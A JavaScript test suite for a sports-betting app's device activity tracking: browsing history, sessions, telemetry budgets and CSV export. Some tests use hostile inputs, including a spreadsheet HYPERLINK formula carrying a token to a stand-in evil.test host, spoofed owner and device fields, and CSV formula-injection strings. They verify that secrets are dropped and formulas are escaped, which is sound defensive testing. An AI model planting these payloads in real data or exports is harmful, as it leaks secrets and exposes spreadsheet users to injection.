'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),os=require('node:os'),path=require('node:path');
const createBoard=require('../board'),A=require('../shared/board-activity');
const ADMIN='/entry-0123456789abcdef0123456789abcdef',DEV='0123456789abcdef01234567',VISIT='v_12345678_abcd';
const SPORTS=Object.fromEntries(['nfl','ncaaf','mlb','nhl'].map(sp=>[sp,{ck:sp,label:sp.toUpperCase(),dir:sp}]));
function fixture(t,{legacy,ua='Mozilla/5.0 Browser'}={}) {
 const dir=fs.mkdtempSync(path.join(os.tmpdir(),'board-activity-'));
 if(legacy){fs.mkdirSync(path.join(dir,'board'));fs.writeFileSync(path.join(dir,'board','devices.json'),JSON.stringify({v:1,devices:{[DEV]:{first:legacy.t,last:legacy.t,role:'guest',ua,ips:{},links:{},sports:{}}}}));fs.writeFileSync(path.join(dir,'board','events-'+new Date().toISOString().slice(0,10)+'.jsonl'),JSON.stringify({...legacy,dev:DEV,role:'guest',sp:'nfl'})+'\n');}
 const board=createBoard({dataDir:dir,sports:SPORTS,adminPath:ADMIN});
 t.after(()=>{board.close();fs.rmSync(dir,{recursive:true,force:true});});
 const who=board.identify({headers:{cookie:'tb_dev='+DEV,'user-agent':ua},socket:{remoteAddress:'127.0.0.1'}},false);
 const send=(events,sp='nfl',person=who)=>board.client(person,'guest',sp,JSON.stringify({events}));
 const get=(suffix='/api/device/'+DEV,role='owner')=>{const res={writeHead(status,headers){this.status=status;this.headers=headers;},end(body){this.body=body;}};const url=new URL(ADMIN+suffix,'http://board.test');board.handle({method:'GET',headers:{host:'board.test'},socket:{remoteAddress:'127.0.0.1'}},res,url.pathname,url.search,role);return {...res,data:res.headers?.['content-type']?.includes('application/json')?JSON.parse(res.body):null};};
 return {board,who,send,get,dir};
}
const page=(route='board',extra={})=>({kind:'page_view',route,vid:VISIT,t:Date.now(),...extra});

test('browser history stores in-app names, visit/session and server receipt clocks, never supplied identity',t=>{
 const f=fixture(t),before=Date.now();f.send([page('board',{t:Date.now()+590000,dev:'evil',sp:'evil',role:'owner'}),page('bets')],'nhl');
 const d=f.get().data;assert.equal(d.browsingHistory.length,2);const entry=d.browsingHistory[0];
 assert.equal(entry.page,'My bets');assert.equal(entry.sp,'nhl');assert.equal(entry.visitId,VISIT);assert.match(entry.sessionId,/^s_/);assert.equal(entry.source,'client');assert.equal(entry.legacy,false);assert.ok(entry.t>=before&&entry.t<=Date.now());assert.equal(entry.t,entry.receivedAt);
 assert.equal(d.role,'guest');assert.equal(d.pageViews,2);assert.equal(d.lastView.route,'bets');assert.ok(d.lastInteractionAt>=before);assert.equal(d.sessionList[0].visitCount,1);assert.equal(d.sessionList[0].durationKind,'observed_span');assert.equal(d.activityCoverage.crossSiteHistory,false);assert.equal(d.activityCoverage.identity,'browser-cookie');
 assert.equal(d.timeline[0].sessionId,entry.sessionId);assert.equal(f.get('/api/device/'+DEV,'guest').status,404);
});

test('unsafe routes, click text, referrers, raw error URLs and arbitrary context never enter new records',t=>{
 const f=fixture(t),secret='private-secret-token';f.send([
 page(ADMIN+'?token='+secret),page('board?token='+secret),page('admin'),
 {kind:'click',route:'board',data:{label:'=HYPERLINK("https://evil.test/'+secret+'")'}},
 {kind:'visit_open',route:'board',vid:VISIT,data:{ref:'https://evil.test/?token='+secret,ctx:{tz:'America/Los_Angeles',locale:'en-US',langs:'en-US,secret?token='+secret,sw:1440,vw:Infinity,touch:-1,dpr:999,visible:false,model:secret}}},
 {kind:'client_error',route:'board',data:{msg:'https://evil.test/?token='+secret,at:secret}},
 page('board',{vid:'https://evil.test/?'+secret})
 ]);
 const d=f.get().data,serialized=JSON.stringify(d);assert.equal(d.browsingHistory.length,1);assert.equal(d.browsingHistory[0].visitId,null);assert.doesNotMatch(serialized,new RegExp(secret));assert.equal(d.ctx.tz,'America/Los_Angeles');assert.equal(d.ctx.visible,false);assert.equal(d.ctx.sw,1440);assert.equal(d.ctx.vw,undefined);assert.equal(d.ctx.touch,undefined);assert.equal(d.ctx.dpr,undefined);assert.equal(d.ctx.model,undefined);assert.equal(d.ctx.langs,'en-US');
});

test('server page fallback and browser view do not double count a single load; failed loads are excluded',t=>{
 const f=fixture(t);f.board.request(f.who,'guest','nfl','GET','/?secret=never-retain',200,2);let d=f.get().data;assert.equal(d.browsingHistory[0].source,'server');assert.equal(d.browsingHistory[0].page,'App page loaded');assert.equal(d.browsingHistory[0].route,'');assert.equal(d.browsingHistory[0].visitId,null);assert.equal(d.lastInteractionAt,null);
 f.send([page('live')]);d=f.get().data;assert.equal(d.browsingHistory.length,1);assert.equal(d.browsingHistory[0].source,'client');assert.equal(d.timeline.find(e=>e.k==='req').p,'/');
 f.board.request(f.who,'guest','mlb','GET','/',500,2);assert.equal(f.get().data.browsingHistory.length,1);
 f.board.request(f.who,'guest','nfl','GET',ADMIN+'/api/security',200,2);assert.equal(f.get().data.timeline.length,3);
});

test('receipt time, not client time or arrival array order, determines session boundaries',()=>{
 const base=1700000000000,events=[{id:'c',t:base-100000,receivedAt:base+A.GAP+2,k:'view',r:'bets',sp:'nhl',visitId:'v_second123'}, {id:'a',t:base+999999999,receivedAt:base,k:'view',r:'board',sp:'nhl',visitId:VISIT}, {id:'b',t:base-999999999,receivedAt:base+1,k:'click',l:'OPEN_GAME',sp:'nhl',visitId:VISIT}];
 const data=A.sessionData(events,DEV);assert.equal(data.sessions.length,2);assert.equal(data.sessions[0].start,base+A.GAP+2);assert.equal(data.sessions[1].dur,1);assert.equal(data.sessions[1].visitCount,1);
 const history=A.browsingHistory(events,DEV,500,data);assert.deepEqual(history.map(e=>e.route),['bets','board']);assert.notEqual(history[0].sessionId,history[1].sessionId);
});

test('legacy history remains visible and explicitly lacks a known receipt or visit clock',t=>{
 const legacy={id:'old',t:Date.now()-1000,k:'view',r:'games'};const f=fixture(t,{legacy});const d=f.get().data;
 assert.equal(d.browsingHistory[0].page,'Games');assert.equal(d.browsingHistory[0].legacy,true);assert.equal(d.browsingHistory[0].receivedAt,null);assert.equal(d.browsingHistory[0].visitId,null);assert.equal(d.activityCoverage.hasLegacyEvents,true);
});

test('batch and per-device event budgets bound capture while preserving another device',t=>{
 const f=fixture(t);for(let i=0;i<5;i++)f.send(Array.from({length:100},()=>page()));assert.equal(f.get().data.views,120);
 const who={...f.who,dev:'abcdef0123456789abcdef01'};f.send([page('live')],'mlb',who);assert.equal(f.get('/api/device/'+who.dev).data.views,1);
});

test('empty batches consume budget and cannot bypass exhausted telemetry limits',t=>{
 const f=fixture(t);for(let i=0;i<120;i++)f.send([]);f.send([page()]);assert.equal(f.get().data.views,0);
});

test('oversized batches and unknown sports are rejected before device creation',t=>{
 const f=fixture(t);f.send([page()],'private');assert.equal(f.get().status,404);f.board.client(f.who,'guest','nfl',JSON.stringify({events:[page()],padding:'x'.repeat(65536)}));assert.equal(f.get().status,404);
});

test('history is capped, dates stay session-correlated and unsuccessful bets do not count as placed',()=>{
 const events=Array.from({length:600},(_,i)=>({id:String(i),t:i+1,receivedAt:i+1,k:'view',r:'board',sp:'nfl'}));events.push({id:'failure',t:601,receivedAt:601,k:'req',m:'POST',p:'/api/bets',s:403});
 const data=A.sessionData(events,DEV),history=A.browsingHistory(events,DEV,9999,data);assert.equal(history.length,500);assert.equal(data.sessions[0].bets,0);assert.equal(history[0].id,'599');assert.equal(history.at(-1).id,'100');
});

test('CSV export neutralizes spreadsheet formula prefixes from historical browser-controlled strings',t=>{
 const f=fixture(t,{legacy:{id:'old',t:Date.now()-100,k:'click',r:'\t@SUM(1+1)',l:'=HYPERLINK("https://example.invalid","open")'},ua:'  +SUM(1+1)'});
 const csv=f.get('/api/export?fmt=csv');assert.equal(csv.status,200);assert.match(csv.body,/'=HYPERLINK/);assert.match(csv.body,/'\t@SUM/);assert.match(csv.body,/'  \+SUM/);
});

test('recent activity changes without mistaking a background live connection for an interaction',t=>{
 const f=fixture(t);f.send([page('board')]);const before=f.get().data;f.board.request(f.who,'guest','nfl','GET','/api/stream',200,2);f.board.streamOpen(DEV);
 const after=f.get().data;assert.equal(after.streaming,1);assert.equal(after.lastInteractionAt,before.lastInteractionAt);assert.equal(after.lastView.route,'board');f.send([page('tools')]);assert.equal(f.get().data.lastView.route,'tools');
});


test('global activity includes errors and automatic requests without changing the high-level feed',t=>{
 const f=fixture(t);f.send([page('live'),{kind:'client_error',route:'live',vid:VISIT}]);
 f.board.request(f.who,'guest','nfl','GET','/api/odds',503,9);
 const d=f.get('/api/board').data;assert.equal(d.activity.length,3);assert.equal(d.activityLimit,500);
 assert.deepEqual(d.activity.map(e=>e.k),['req','err','view']);assert.equal(d.activity[0].s,503);assert.equal(d.activity[1].msg,'Browser reported an application error');
 assert.deepEqual(d.feed.map(e=>e.k),['view']);assert.ok(d.activity.every(e=>e.drole==='guest'));assert.equal(f.get('/api/board','guest').status,404);
});

test('global activity and high-level feed retain their independent bounds',t=>{
 const f=fixture(t);for(let i=0;i<300;i++)f.board.request(f.who,'guest','nfl','GET','/',200,1);
 for(let i=0;i<550;i++)f.board.request(f.who,'guest','nfl','GET','/api/odds',200,1);
 const d=f.get('/api/board').data;assert.equal(d.activity.length,500);assert.equal(d.feed.length,250);assert.ok(d.activity.every(e=>e.p==='/api/odds'));assert.ok(d.feed.every(e=>e.p==='/'));
});

test('request descriptions distinguish a logged ticket and requested handoff from a confirmed wager',t=>{
 const f=fixture(t);f.board.request(f.who,'guest','mlb','GET','/',200,1);f.board.request(f.who,'guest','mlb','POST','/api/bets',200,1);f.board.request(f.who,'guest','mlb','GET','/api/betmgm/go',302,1);
 const rows=f.get('/api/board').data.activity;assert.deepEqual(rows.map(e=>e.text),['Requested BetMGM handoff','Logged a bet','Loaded an app page']);assert.doesNotMatch(JSON.stringify(rows),/Placed a bet|filled-in slip|Opened the board/);
});


test('historical errors without a message use a generic label while recorded messages remain intact',t=>{
 const empty=fixture(t,{legacy:{id:'error-empty',t:Date.now()-100,k:'err'}});
 assert.equal(empty.get('/api/board').data.activity[0].text,'Browser reported an application error');
 const recorded=fixture(t,{legacy:{id:'error-message',t:Date.now()-100,k:'err',msg:'Saved error fixture'}});
 assert.equal(recorded.get('/api/board').data.activity[0].text,'App error: Saved error fixture');
});
